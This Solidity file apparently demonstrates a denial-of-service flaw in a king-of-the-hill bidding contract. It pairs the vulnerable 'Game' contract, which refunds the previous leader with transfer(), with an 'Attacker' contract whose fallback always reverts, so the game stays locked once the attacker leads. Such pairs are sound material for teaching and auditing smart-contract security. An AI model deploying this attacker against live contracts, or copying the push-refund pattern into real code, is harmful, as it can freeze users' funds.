pragma solidity 0.5.16;

contract Game {
    
    address payable public currentLeader;
    uint    public highestBid;
    
    function () external payable {
        require( msg.value > highestBid, "Bid is too low" );
        address payable oldLeader = currentLeader;
        uint refundAmount = highestBid;
        
        currentLeader = msg.sender;
        highestBid = msg.value;
        oldLeader.transfer(refundAmount);
    }
}

contract Attacker {
    function bid(address game) public payable {
        (bool success, ) = game.call.value(msg.value)("");
        require(success);
    }
    
    function() external payable {
        revert();
    }
}